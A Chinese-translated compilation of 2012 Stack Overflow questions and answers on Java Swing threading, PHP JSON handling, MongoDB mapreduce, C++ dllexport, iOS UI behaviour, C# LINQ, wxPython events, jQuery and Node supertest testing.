1.  [http://msdn.microsoft.com/en-us/library/hz88kef0.aspx](http://msdn.microsoft.com/en-us/library/hz88kef0.aspx)
2.  [http://dpcarlisle.blogspot.com.au/2007/05/exslt-node-set-function.html](http://dpcarlisle.blogspot.com.au/2007/05/exslt-node-set-function.html)
3.  [如何以独立于平台的方式使用节点集功能？](https://stackoverflow.com/questions/92076/how-to-use-node-set-function-in-a-platform-independent-way)

# java - JTextArea 附加问题

> ID：11927167
> 
> 赞同：3
> 
> 时间：2012-08-13T01:12:27.890
> 
> 标签：java, multithreading, swing, jtextarea, swingworker

我正在制作一个备份程序，我希望程序备份的所有内容都显示在 JTextArea 上。好吧，它可以工作，但只有在程序完成备份之后。我该如何解决？我运行的代码在这里：

备份方法

```
public void startBackup() throws Exception {
    // txtarea is the JTextArea
    Panel.txtArea.append("Starting Backup...\n");

    for (int i = 0; i < al.size(); i++) {
        //al is an ArrayList that holds all of the backup assignments selected
        // from the JFileChooser

        File file = new File((String) al.get(i));
        File directory = new File(dir);

        CopyFolder.copyFolder(file, directory);
            }
     } 
```

复制文件夹类：

```
public class CopyFolder {
public static void copyFolder(File src, File dest) throws IOException {

    if (src.isDirectory()) {

        // if directory not exists, create it
        if (!dest.exists()) {
            dest.mkdir();
            Panel.txtArea.append("Folder " + src.getName()
                    + " was created\n");
        }

        // list all the directory contents
        String files[] = src.list();

        for (String file : files) {
            // construct the src and dest file structure
            File srcFile = new File(src, file);
            File destFile = new File(dest, file);
            // recursive copy
            copyFolder(srcFile, destFile);
        }

    } else {
        try {
            CopyFile.copyFile(src, dest);
        } catch (Exception e) {
        }
    }
}
    } 
```

复制文件类

```
public class CopyFile {

public static void copyFile(File src, File dest) throws Exception {
    // if file, then copy it
    // Use bytes stream to support all file types
    InputStream in = new FileInputStream(src);
    OutputStream out = new FileOutputStream(dest);

    byte[] buffer = new byte[1024];

    int length;
    // copy the file content in bytes
    while ((length = in.read(buffer)) > 0) {
        out.write(buffer, 0, length);
    }

    in.close();
    out.close();
    // System.out.println("File copied from " + src + " to " + dest);
    Panel.txtArea.append("File copied " + src.getName() + "\n");
}
    } 
```

提前感谢您的帮助，并让我知道我可以提供的任何帮助。我对此进行了谷歌搜索，这似乎是一个大问题，但我只是想不出如何解决它。哦，请不要仅仅因为它不适用于您而对此投反对票，这非常令人恼火。再次提前感谢！

**编辑**：这就是我得到的：

```
public class test extends SwingWorker<Void, String> {
String txt;
JTextArea txtArea = null;

public test(JTextArea txtArea, String str) {
    txt = str;
    this.txtArea = txtArea;
}

protected Void doInBackground() throws Exception {

    return null;
}

protected void process(String str) {
    txtArea.append(str);
}

protected void getString() {
    publish(txt);
}
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T01:21:25.403

您遇到的主要问题是您试图在[Event Dispatching Thread](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/dispatch.html)中执行阻塞操作。这将阻止 UI 更新，因为在您完成之后，重绘请求才会到达重绘管理器。

为了克服这个问题，您需要将阻塞工作（即备份进程）卸载到单独的线程。

为此，我建议您阅读[Swing Trail](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/index.html)中的并发，它将为您提供一些有用的策略来解决您的特定问题。特别是，您可能会从使用[SwingWorker中受益](http://docs.oracle.com/javase/7/docs/api/javax/swing/SwingWorker.html)

仔细看看[doInBackground](http://docs.oracle.com/javase/7/docs/api/javax/swing/SwingWorker.html#doInBackground%28%29)和[过程](http://docs.oracle.com/javase/7/docs/api/javax/swing/SwingWorker.html#process%28java.util.List%29)方法

**更新示例**

好的，这是一个非常简单的例子。这基本上会将您 C:\ 驱动器带到 3 个目录深处并将内容转储到提供的`JTextArea`

```
public class BackgroundWorker extends SwingWorker<Object, File> {

    private JTextArea textArea;

    public BackgroundWorker(JTextArea textArea) {

        this.textArea = textArea;

    }

    @Override
    protected Object doInBackground() throws Exception {

        list(new File("C:\\"), 0);

        return null;

    }

    @Override
    protected void process(List<File> chunks) {

        for (File file : chunks) {

            textArea.append(file.getPath() + "\n");

        }

        textArea.setCaretPosition(textArea.getText().length() - 1);

    }

    protected void list(File path, int level) {

        if (level < 4) {

            System.out.println(level + " - Listing " + path);

            File[] files = path.listFiles(new FileFilter() {

                @Override
                public boolean accept(File pathname) {

                    return pathname.isFile();

                }
            });

            publish(path);
            for (File file : files) {

                System.out.println(file);
                publish(file);

            }

            files = path.listFiles(new FileFilter() {

                @Override
                public boolean accept(File pathname) {

                    return pathname.isDirectory() && !pathname.isHidden();

                }
            });

            for (File folder : files) {

                list(folder, level + 1);

            }

        }

    }

} 
```

您只需打电话`new BackgroundWorker(textField).execute()`并走开：D

**更新了明确的例子**

```
public class BackgroundWorker extends SwingWorker<Object, String> {

    private JTextArea textArea;
    private File sourceDir;
    private File destDir;

    public BackgroundWorker(JTextArea textArea, File sourceDir, File destDir) {

        this.textArea = textArea;
        this.sourceDir = sourceDir;
        this.destDir = destDirl

    }

    @Override
    protected Object doInBackground() throws Exception {

        if (sourceDir.isDirectory()) {

            // if directory not exists, create it
            if (!destDir.exists()) {
                destDir.mkdir();
                publish("Folder " + sourceDir.getName() + " was created");
            }

            // list all the directory contents
            String files[] = sourceDir.list();

            for (String file : files) {
                // construct the src and dest file structure
                File srcFile = new File(sourceDir, file);
                File destFile = new File(destDir, file);
                // recursive copy
                copyFolder(srcFile, destFile);
            }

        } else {
            try {
                copyFile(sourceDir, destDir);
            } catch (Exception e) {
            }
        }

        return null;

    }

    public void copyFolder(File src, File dest) throws IOException {

        if (src.isDirectory()) {

            // if directory not exists, create it
            if (!dest.exists()) {

                publish("Folder " + src.getName() + " was created");
            }

            // list all the directory contents
            String files[] = src.list();

            for (String file : files) {
                // construct the src and dest file structure
                File srcFile = new File(src, file);
                File destFile = new File(dest, file);
                // recursive copy
                copyFolder(srcFile, destFile);
            }

        } else {
            try {
                copyFile(src, dest);
            } catch (Exception e) {
            }
        }
    }

    public void copyFile(File src, File dest) throws Exception {
        // if file, then copy it
        // Use bytes stream to support all file types
        InputStream in = new FileInputStream(src);
        OutputStream out = new FileOutputStream(dest);

        byte[] buffer = new byte[1024];

        int length;
        // copy the file content in bytes
        while ((length = in.read(buffer)) > 0) {
            out.write(buffer, 0, length);
        }

        in.close();
        out.close();
        publish("File copied " + src.getName());

    }

    @Override
    protected void process(List<String> chunks) {

        for (String msg : chunks) {

            textArea.append(msg + "\n");

        }

        textArea.setCaretPosition(textArea.getText().length() - 1);

    }
} 
```

现在要跑...

```
new BackgroundWorker(textArea, sourceDir, destDir).execute(); 
```

# php - 如何反序列化 json 结果以 HTML / CSS Styled 格式显示它们？

> ID：11927169
> 
> 赞同：1
> 
> 时间：2012-08-13T01:12:34.540
> 
> 标签：php, api, json

我刚刚开始使用 Google API for Custom Search Engine，并且成功地完成了我的第一个请求，如下所示：

**My_first_Search.php**

```
 require_once 'apis/apiClient.php';
 require_once 'apis/contrib/apiCustomsearchService.php';
 session_start();

 $client = new apiClient();
 $client->setApplicationName('Google CustomSearch PHP Starter Application');
 // Docs: http://code.google.com/apis/customsearch/v1/using_rest.html
 // My developer key (simple api key).
 $client->setDeveloperKey('***********************************');
 $search = new apiCustomsearchService($client);

  // executing a search with your custom search id.
  $result = $search->cse->listCse('burrito', array(
  'cx' => '123456789123546789:*******', // The custom search engine ID to scope this search query.
  ));
 print "<pre>" . print_r($result, true) . "</pre>";

 // executing a search with the URL of a linked custom search engine.
 $result = $search->cse->listCse('burrito', array(
 'cref' => 'http://www.google.com/cse/samples/vegetarian.xml',
  ));
 print "<pre>" . print_r($result, true) . "</pre>"; 
```

**输出：** [此文件](http://homepage-changer.com/search/google.php)`burrito`以 JSON 格式正确输出关键字的结果

如何淡化然后使用 for-each 循环操纵结果以获得：

```
 - Result title
  - Result description
  - URL 
```

[单击此处查看要操作的 JSON 输出](http://homepage-changer.com/search/google.php)

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T01:16:09.943

你的“这个文件”没有输出 json。JSON 是 JS 中变量赋值的文本表示。例如 的右侧`var x = ...json here...`。该转储是一个 PHP 数据结构，它是通过解码 json 字符串生成的。

换句话说，不要纠结于您正在获取 JSON 的事实——一旦它被解码，它就只是另一个 PHP 数组，您可以使用普通的 PHP 数组操作和索引来获取您的数据。

例如

```
$arr['queries']['nextPage'][0]['title'] // Google Custom Search - burrito 
```

# mongodb - mongodb检查地图功能中有一个文档

> ID：11927172
> 
> 赞同：1
> 
> 时间：2012-08-13T01:13:11.857
> 
> 标签：mongodb, dictionary, mapreduce, document

我正在处理聚合数据（mapreduce），当 map 函数上只有一个文档时，它不会将其发送到 reduce。有没有办法检查地图内部只有一个文档或通过reduce强制它？

**更新**

正如我在下面发布的那样，这个问题的解决方案（尽管性能损失很大）是始终计算 map 中的值，并将其添加到 emit 对象中。如果发射通过reduce，我们会用适当的组计算覆盖这些值，否则它将按照map中的计算输出。

# c++ - 内联和 dlimport/dllexport

> ID：11927173
> 
> 赞同：4
> 
> 时间：2012-08-13T01:13:24.367
> 
> 标签：c++, inline, dllimport, dllexport

现在我分析一些不是我写的旧代码。在标头中有许多这样的声明：

```
SVPDSDKDLLEXPORT inline C3vec mult(C3vec src, D3DXMATRIX &m); 
```

SVPDSDKDLLEXPORT 定义为 _declspec(dllexport)，如果在 SVPDSDK 中使用；如 _declspec(dllimport)，如果它用于任何使用 SVPDSDK.dll 的项目中。这里的内联对我来说似乎很奇怪，因为标题中没有定义，它在 .cpp 文件中，但是 SVPDSDK 和所有使用各自 DLL 的项目的编译和链接都可以毫无问题地执行。我假设它只是被忽略并且函数被导出，就好像它没有被内联一样。

我发现了这个讨论： [C++ : inline functions with dllimport/dllexport?](https://stackoverflow.com/questions/8876279/c-inline-functions-with-dllimport-dllexport)

看起来我应该从所有此类声明中删除“内联”，不要混合内联和导出/导入。但后来我在 MSDN 中找到了这个主题：http: [//msdn.microsoft.com/en-us/library/xa0d9ste](http://msdn.microsoft.com/en-us/library/xa0d9ste)

我不明白它的某些部分。

> 您可以使用 dllexport 属性将函数定义为内联函数。在这种情况下，函数总是被实例化和导出，无论程序中的任何模块是否引用该函数。假定该函数是由另一个程序导入的。

首先，“函数总是被实例化”，这是什么意思？我只找到关于 C++ 中模板函数实例化的主题，没有任何其他实例化。它是否仅与模板连接？

其次，“函数总是导出的”。我完全不明白。是否有可能在某些情况下不导出带有 declspec(_dllexport) 的函数？在什么情况下？

现在关于导入：

> 您还可以将使用 dllimport 属性声明的函数定义为内联函数。在这种情况下，函数可以扩展（根据 /Ob 规范），但永远不会被实例化。特别是，如果采用内联导入函数的地址，则返回驻留在 DLL 中的函数的地址。此行为与获取非内联导入函数的地址相同。

同样，我不明白，在这种情况下实例化是什么意思。

在写这个问题并从 MSDN 分析主题时，我得出一个结论，该函数同时导出/导入和内联，仅在其项目本身中内联（在我的情况下为 SVPDSDK），并且在所有情况下都是非内联的导入项目。它没有在 MSDN 主题中明显声明。如果我没有在任何使用它的项目中导入它，并且我在它的头文件中没有定义，它将是一个普通的内联函数，所以我会得到一个链接错误。然后在我看来，混合内联和导出/导入是可以接受的，认为它与上面提到的stackoverflow讨论中的答案相矛盾。我对吗？
而且我仍然不明白关于内联函数实例化的所有这些话。

对不起，我把一些问题合并在一个主题中，但我不知道如何将它分成不同的问题，因为它们是由同一个问题和相同的材料结合在一起的。但是，如果有人能为我澄清这个问题，我将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T02:20:14.023

实际上，`inline`是对优化器的一种提示。编译器仍然可以生成带有主体的真实函数，将参数压入堆栈等。这不会破坏任何逻辑。如果您的“内联”函数有超过 10000 行代码，它肯定会这样做。微软甚至有特殊的`__forceinline`关键字。猜猜它为什么被引入。

`The function is always instantiated and exported ...`

这里的措辞可能并不完美。实例化在这里意味着将生成一个主体和一个入口点。这与模板实例化无关。整个段落的意思`__declspec`是比 更重要`inline`。

因为`dllimport`他们基本上写的是`dllimport`防止在当前二进制模块中生成这个内联函数的主体，而内联扩展仍然是可能的。

# iphone - 添加平移手势识别器时，我的按钮不会保持突出显示？

> ID：11927175
> 
> 赞同：0
> 
> 时间：2012-08-13T01:13:48.057
> 
> 标签：iphone, ios, uigesturerecognizer, uipangesturerecognizer

我`UIPanGestureRecognizer`在我的`UIButton`. 现在，当我按下按钮后用手指拖动一小段距离时，按钮停止突出显示。通常，除非您将 UIButtons 框架拖出很远，否则 UIButton 将保持突出显示。但是，使用平移手势识别器，现在即使我稍微拖动，按钮也会停止突出显示。

我的代码中没有任何内容将按钮高亮属性设置为否。我什至尝试擦除平移手势识别器动作选择器中的所有代码（每当我平移按钮时都会调用该方法）。

我还尝试在平移手势识别器的动作选择器中将按钮的突出显示属性设置为 NO。

这种工作只是突出显示闪烁。当您平移时，突出显示的部分消失了，然后很快又回来了，就像闪光灯一样。所以，这也行不通。有任何想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T01:34:58.850

默认情况下，手势将取消它们链接到的视图中的触摸。因此，当您的按钮中的触摸被取消时，它变得不突出。要防止这种行为，请将`cancelsTouchesInView`手势的属性设置为`NO`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T01:25:06.817

这将起作用

```
-(void) panDetected:(UIGestureRecognizer *) gesture 
{
    if(gesture.state == UIGestureRecognizerStateBegan)
    {
        yourButton.backgroundImageView.image = [UIImage imageNamed:@"your_button_highlited_image.png"];
    }
    else if(gesture.state == UIGestureRecognizerStateChanged)
    {

    }
    else if(gesture.state == UIGestureRecognizerStateEnded)
    {
        yourButton.backgroundImageView.image = [UIImage imageNamed:@"your_button_normal_image.png"];
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T15:30:46.740

我也遇到过同样的问题。borrrden 是对的；要修复它，请将 viewController 设置为 gestureRecognizer 的委托，如果触摸在 IUButton 上，则取消触摸。首先在 .h 文件中添加协议 `UIGestureRecognizerDelegate。然后，在创建手势识别器之后，将视图控制器设置为其委托：

```
UITapGestureRecognizer *gestureRecognizer = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(aMethod)];
gestureRecognizer.delegate = self;
[self.view addGestureRecognizer:gestureRecognizer];
[gestureRecognizer release]; 
```

最后覆盖`shouldReceiveTouch`并取消不需要的触摸：

```
- (BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldReceiveTouch:(UITouch *)touch{

    if ([touch.view isKindOfClass:[UIButton class]]) { //Do not override UIButton touches
        return NO;
    }
    return YES;
} 
```

# c# - 在另一种方法中使用 LINQ 变量？

> ID：11927176
> 
> 赞同：0
> 
> 时间：2012-08-13T01:13:53.137
> 
> 标签：c#, linq, grasshopper

在下面的代码中，我试图将数组分配给`Filepaths`变量`m_settings`，但`Filepaths`在 LINQ 方法之外无法识别。如何将 的内容存储在`FilePaths`我可以在`SolveInstance`方法中使用的变量中？

```
public void ShowSettingsGui()
{
    var dialog = new OpenFileDialog()
    {
        Multiselect = true,
        Filter = "Data Sources (*.ini)|*.ini*|All Files|*.*"
    };
    if (dialog.ShowDialog() != DialogResult.OK) return;
    var paths = dialog.FileNames;
    var FilePaths = paths.ToDictionary(filePath => filePath, File.ReadAllText);
}

private string[] m_settings = Filepaths;  

protected override void SolveInstance(IGH_DataAccess DA)
{
    if (m_settings == null)
    {
        AddRuntimeMessage(GH_RuntimeMessageLevel.Warning, "You must declare some valid settings");
        return;
    }

    DA.SetData(0, m_settings);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T01:18:33.790

我可能读得太多了，但我认为您不需要 FilePaths，您可以直接设置 m_settings ...

```
private Dictionary<string, string> m_settings;  

public void ShowSettingsGui()
{
    var dialog = new OpenFileDialog()
    {
        Multiselect = true,
        Filter = "Data Sources (*.ini)|*.ini*|All Files|*.*"
    };
    if (dialog.ShowDialog() != DialogResult.OK) return;
    var paths = dialog.FileNames;
    m_settings = paths.ToDictionary(filePath => filePath, File.ReadAllText);
}

protected override void SolveInstance(IGH_DataAccess DA)
{
    if (m_settings == null)
    {
        AddRuntimeMessage(GH_RuntimeMessageLevel.Warning, "You must declare some valid settings");
        return;
    }

    DA.SetData(0, m_settings);
} 
```

您还需要确保在 ShowSettingsGui 之后调用 SolveInstance，否则 m_settings 将始终为 null

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T01:17:32.143

```
public void ShowSettingsGui()
{
    var dialog = new OpenFileDialog()
    {
        Multiselect = true,
        Filter = "Data Sources (*.ini)|*.ini*|All Files|*.*"
    };
    if (dialog.ShowDialog() != DialogResult.OK) return;
    var paths = dialog.FileNames;
    var FilePaths = paths.ToDictionary(filePath => filePath, File.ReadAllText);

    // You need to add this
    this.m_settings  = FilePaths;
}

// You also need to change the type of m_settings from string[] to Dictionary<string, string>
private Dictionary<string, string> m_settings = Filepaths;  

protected override void SolveInstance(IGH_DataAccess DA)
{
    if (m_settings == null)
    {
        AddRuntimeMessage(GH_RuntimeMessageLevel.Warning, "You must declare some valid settings");
        return;
    }

    DA.SetData(0, m_settings);
} 
```

# python - 使用 wxPython 在 Python 中文本上的鼠标事件

> ID：11927178
> 
> 赞同：2
> 
> 时间：2012-08-13T01:14:40.740
> 
> 标签：python, wxpython

这就是我想要做的：

我创建了一个窗口，上面显示了文本，作为用户，我单击文本，例如：显示的文本是。

```
'Hello World, I am a Python program.' 
```

因此，如果用户单击单词，我希望它生成一个事件，它会进入一个函数，我想在函数中做一些事情*（比如改变那个单词的颜色，所以我还需要跟踪我点击了哪个单词）*

我不太确定如何做到这一点，我可以将每个单词都变成一个按钮，但这会很难看。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:29:16.250

```
import wx
def SomeListener(evt):
    print "Got Event:",evt
    print "My XY:",evt.GetX(),evt.GetY()
    #youll have to figure out which word you clicked using x,y (note x,y relative to static text field)
a= wx.App(redirect=False)
f = wx.Frame(None,-1)
p = wx.Panel(f,-1)
t = wx.StaticText(p,-1,"Some Text")
t.Bind(wx.EVT_LEFT_DOWN,SomeListener)
f.Show()
a.MainLoop() 
```

或使用 htmlwin ......但它强调了所有的话......我无法弄清楚如何不这样做

```
import wx

import wx.html
def OnClickWord(e):
    print "You Clicked:",e.GetLinkInfo().GetHref()
    return
class MyHtmlFrame(wx.Frame):

    def __init__(self, parent, title):

        wx.Frame.__init__(self, parent, -1, title)

        html = wx.html.HtmlWindow(self)

        #if "gtk2" in wx.PlatformInfo:

        html.SetStandardFonts()

        html.SetPage(
        "<style>a {text-decoration: none;color: #000; }</style>" #sorry no css support :/
        "<a href=\"word1\">Word1</a> <a href=\"word2\">word 2</a> <a href=\"wizard of oz\">wizard of oz</a>.")

app = wx.PySimpleApp()

frm = MyHtmlFrame(None, "Simple HTML")
frm.Bind(wx.html.EVT_HTML_LINK_CLICKED,OnClickWord)
frm.Show()

app.MainLoop() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-06T05:05:49.173

如果您不介意每个单词看起来像亮蓝色下划线链接，那么 Joran 的解决方案很好。

对于那些有兴趣在没有蓝色下划线“热链接”样式文本的情况下执行此操作的人，可以通过设置 RichText 窗口来完成。下面的代码是一个代码示例：它获取您放入“text”变量的任何内容并将其处理到 RichText 窗口中，使其看起来像普通文本，但每个单词在单击时都会引发 OnURL 事件。用户和程序员都不必担心设置，只需将“文本”传递给 URLtagger 并根据需要处理 OnURL 调用。

此示例只是将单击的单词传递给 OnURL 事件，如果您想要每个单词的唯一标识符，请在 URLtagger 方法中添加它们，请注意标识符完全独立于显示的文本，因此您可以根据需要显示文本并接收数字。

```
import wx
import wx.richtext as rt

class RichTextFrame(wx.Frame):
    def __init__(self, *args, **kw):
        wx.Frame.__init__(self, *args, **kw)
        self.rtc = rt.RichTextCtrl(self, style=wx.VSCROLL|wx.HSCROLL|wx.NO_BORDER);
        wx.CallAfter(self.rtc.SetFocus)
        self.rtc.Bind(wx.EVT_TEXT_URL, self.OnURL)

    def URLtagger(self, text):
        for word in text.split():
            self.rtc.BeginURL(word)
            self.rtc.WriteText(" "+word+" ")
            self.rtc.EndURL()

    def OnURL(self, evt):
        wx.MessageBox(evt.GetString(), "Word Clicked")

class TestPanel(wx.Panel):
    def __init__(self, parent):
        wx.Panel.__init__(self, parent, -1)
        if rt.RichTextBuffer.FindHandlerByType(rt.RICHTEXT_TYPE_HTML) is not None:
            return
        rt.RichTextBuffer.AddHandler(rt.RichTextHTMLHandler())
        rt.RichTextBuffer.AddHandler(rt.RichTextXMLHandler())
        wx.FileSystem.AddHandler(wx.MemoryFSHandler())
        self.win = RichTextFrame(self, -1, "wx.richtext.RichTextCtrl",
                            size=(700, 500),
                            style = wx.DEFAULT_FRAME_STYLE)
        self.win.Show(True)

app = wx.App(0)
frame = wx.Frame(None)
panel = TestPanel(frame)
frame.Hide()
text = 'It was the best of times, it was the worst of times, it was the age of wisdom, it was the age of foolishness.'
panel.win.URLtagger(text)
app.MainLoop() 
```

# objective-c - 这会导致保留周期吗？

> ID：11927183
> 
> 赞同：-1
> 
> 时间：2012-08-13T01:16:47.567
> 
> 标签：objective-c, ios

我将文件中的 一个`UISegmentedControl`对象连接到. 然后我把这个方法放在：`.xib``IBOutle UISegmentedControl` `ivar``ViewController.h``ViewController.m`

```
-(IBAction)switchMapTypes {
    if (switchMapTypes.selectedSegmentIndex == 0)
        [worldView setMapType: MKMapTypeStandard];

    else if (switchMapTypes.selectedSegmentIndex == 1)
        [worldView setMapType: MKMapTypeSatellite];

    else if (switchMapTypes.selectedSegmentIndex == 2)
        [worldView setMapType: MKMapTypeHybrid];
} 
```

如果我将此方法链接回文件中的`UISegmentedControl`对象，这会导致保留周期`.xib`吗？还是我完全误解了保留周期是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T01:24:04.400

当一个对象拥有另一个对象，而另一个对象又拥有第一个对象时，就会发生保留循环。您的分段控件不要求拥有视图控制器的所有权——连接一个`IBAction`没有所有权后果——所以这里没有循环。

不过，有一个风格问题。您似乎有一个方法，它不是与 ivar 同名的 getter `switchMapTypes`，。您不应该对两个这样不同的事物使用相同的名称。此外，您的 ivar 名称应该是一个名词，而方法（它是一个动作）是一个动词。我会建议`mapTypesSwitch`ivar 和`changeMapType`行动。

# objective-c - UITableViewCell：在didSelect之后或从推送的VC返回时立即取消选择？

> ID：11927186
> 
> 赞同：0
> 
> 时间：2012-08-13T01:18:07.260
> 
> 标签：objective-c, uitableview

我见过人们这样做的方式不同，我希望当您在`UITableView`（例如在屏幕 A 中）选择一个项目时，该项目被突出显示（选择），另一个屏幕 B 被推送到导航堆栈，然后当您返回时从屏幕B到屏幕A，之前选择的项目将被动画取消选择，所以你要做的是放：

```
[self.tableView deselectRowAtIndexPath:[self.tableView indexPathForSelectedRow] animated:YES]; 
```

里面：

```
- (void)viewWillAppear:(BOOL)animated; 
```

这就是 Apple 的示例代码所做的。但是我看到很多人在选中该行后立即取消选择该行：

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath 
```

我知道这可能只是个人喜好，但我想知道官方对此有什么澄清吗？取消选择`viewWillAppear:`让用户知道他/她之前选择的项目，这是一个奖励，但是对于某些自定义单元格，选择的背景/视图可能不仅仅是纯色，他们可能会在单元格中添加一个 UIView 来表示选择的状态，如果一些单元格被动画取消选择，而一些单元格在没有动画的情况下被选中，这会使应用程序不一致。

有谁有想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T01:44:05.520

这取决于您，如果您要广泛地自定义应用程序 UI，那么您可能根本不想使用此突出显示。也许您有一个复杂的单元格，而不是使用单元格选择触发器来深入查看详细信息视图或其他，也许您的`UIButton`单元格内部会有一个。

在我看来，UIKit 想要突出显示单元格并保留它的突出显示，直到您弹出详细视图控制器，此时，大概在 中`viewWillAppear:`，当前选定的单元格`UITableView`被取消选择，这使您可以有一个非常微妙和简短的指示选择哪个单元格来访问您刚刚来自的地方。

这样说听起来不太有趣，但是想象一下，如果您退出应用程序并在几个小时后返回，那么拥有这个小而且正如我所说的非常微妙的动画是很好的。

在我过去完成的应用程序中，我倾向于不经常使用它，或者选择但立即取消选择，因此用户在返回或“返回”到列表时不会看到取消选择动画。但这就是说，我所指的应用程序中的所有单元格都经过了高度定制。

# objective-c - 从应用程序委托中关闭模式视图控制器

> ID：11927187
> 
> 赞同：4
> 
> 时间：2012-08-13T01:18:23.993
> 
> 标签：objective-c, ios, xcode, facebook

我正在使用 facebook SDK 登录我的应用程序。如果用户没有登录，登录 VC 模态出现。用户点击登录后，如果登录成功，它会提醒 App Delegate。如果是，我想关闭模态登录 VC。如何从应用程序委托执行此操作？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-23T13:59:07.100

您可以尝试关闭呈现的 ViewController，因为必须呈现模态视图控制器

```
UINavigationController *navigationController = (id) self.window.rootViewController;
[[navigationController presentedViewController] dismissModalViewControllerAnimated:NO]; 
```

如果您想检查是否正在显示特定的 ViewController（即仅在显示某个 ViewController 时关闭），那么您可以添加检查。

```
UIViewController *viewController = [navigationController presentedViewController];

if ([viewController isMemberOfClass:[YourViewController class]]) {
    [viewController dismissModalViewControllerAnimated:NO];
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-13T01:26:38.697

appDelegate 需要某种方式来知道托管 viewController 是谁，因此它可以发送关闭消息。你需要想出一些方法来实现这一点。一种方法是在 appDelegate“callDismissOnMeIfFaceBookFails”上定义一个 ivar，并在您处于这种情况时设置它，否则它为零。

请注意，如果它为 nil，则 appDelegate 可以毫无问题地发送关闭消息！使用 nil 消息传递对您有利（我一直使用它）。[旁白：我看到了很多代码“if(obj) [obj message];” 不要做 if - 只是发送消息 - 如果 obj 为 nil 它没有效果并且被有效处理！]

编辑：

所以你有一个类 AppDelegate。在#interface 中定义一个属性：

```
@property (nonatomic, strong) UIViewController *callDismissOnMeIfFaceBookFails; 
```

并在实现中@synthesize 它。定义一个方法：

```
- (void)dismissLoginView
{
  [callDismissOnMeIfFaceBookFails dismissModalViewControllerAnimated:YES];
  callDismissOnMeIfFaceBookFails = nil; // don't need it now, this unretains it
} 
```

因此，在呈现模态视图控制器之前，呈现对象将 appDelegate 属性“callDismissOnMeIfFaceBookFails”设置为自身。

当用户成功登录后，登录对象会向 appDelegate 发送消息，告知其关闭登录视图。

# javascript - 将元素添加到文档时是否有 jQuery 事件？

> ID：11927193
> 
> 赞同：-2
> 
> 时间：2012-08-13T01:19:34.333
> 
> 标签：javascript, jquery

> **可能重复：**
> [是否有 jQuery DOM 更改侦听器？](https://stackoverflow.com/questions/2844565/is-there-a-jquery-dom-change-listener)
> [元素添加到页面时的事件](https://stackoverflow.com/questions/7434685/event-when-element-added-to-page)

将元素添加到文档时是否有 jQuery 事件？

**编辑**

好的，等一下！天哪！我正在使用 knockoutjs，它会动态添加元素。我必须在我的文本框中添加以下内容：

```
$(document).ready(function () {
    ko.applyBindings(new EditCatalogViewModel());
}); 
```

**进一步编辑**

我想我的问题将不得不无人回答。非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T01:22:15.983

不，没有，如果您查看[jQuery 事件](http://api.jquery.com/category/events/)列表，它没有列出。但是，如果您提前知道将添加元素的位置，则可以创建自己的侦听器和事件。

# objective-c - 目标 C：ADBannerView 更改大小和位置

> ID：11927195
> 
> 赞同：1
> 
> 时间：2012-08-13T01:20:14.460
> 
> 标签：objective-c, iad, adbannerview

我正在尝试为我的应用程序实施 iAd 横幅，但我似乎无法正确执行。

我正在尝试`ADBannerView`在我的应用程序上放置一个仅出现在横向上的纵向尺寸，但我不知道如何将它放置在中心。

或者有没有一种可能的方法可以调整`ADBannerView`横向大小和重新定位？因为当我点击广告时，广告也（当然）是纵向的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T01:26:42.567

好的！我已经找到答案了！我使用此代码进行定位。

```
adBannerView.frame = CGRectOffset(adBannerView.frame, 100, 0); 
```

# javascript - 节点中的超测自定义快递服务器

> ID：11927196
> 
> 赞同：31
> 
> 时间：2012-08-13T01:20:26.597
> 
> 标签：javascript, unit-testing, node.js, mocha.js

请对我温柔一点。我是异步编码的新手，并且一头扎进了一个使用节点开发和 API 服务器的密集项目。我很喜欢它，但有些事情不是自然而然的。

我们的项目是使用 express js 构建的。我们有一个文件 server.js，我们在其中实例化了一个快速服务器，该服务器又实例化了我们的路由器等等。我现在需要集成测试这个（部分）完整的服务器。通常我所做的是从命令行运行“%node server.js”，然后使用 python 请求或 curl 发出请求并检查响应。

现在我的任务是编写一个单元和集成测试套件，以便我们可以自动化我们的测试。我一直在使用 mocha，现在正在尝试使用 supertest 进行集成测试。问题是 supertest 需要一个服务器对象，然后它会对其应用测试，但是我们构建服务器对象的文件不会返回任何内容。我不想修改那个文件，所以对于如何访问用于测试的服务器对象感到困惑。

我的服务器文件（部分）如下所示：

```
var express = require('express')

var app = express();

// Express Configuration
app.use(express.favicon()); //handles favicon request, which keeps it out of the log when using a browser :)
app.use(express.bodyParser()); //slurps up the body in chunks the node.js way :)
// ...and so on 
```

我的摩卡测试文件看起来像这样

```
var request = require('supertest')
  , app     = require('../server.js')
  , assert  = require("assert");

describe('POST /', function(){
  it('should fail bad img_uri', function(done){
    request(app)
        .post('/')
        .send({
            'img_uri' : 'foobar'
        })  
        .expect(500)
        .end(function(err, res){
        console.dir(err)
        console.dir(res)
            done();
        })  
  })    
}) 
```

当我运行这个测试时，我收到一个关于应用程序对象没有名为地址的方法的投诉。我的问题是，有没有一种方法可以要求/调用 server.js 文件，以便 app 对象在范围内？还是我要解决这个问题。我也尝试过使用 http.js 直接调用服务器，但也没有运气。谢谢！

* * *

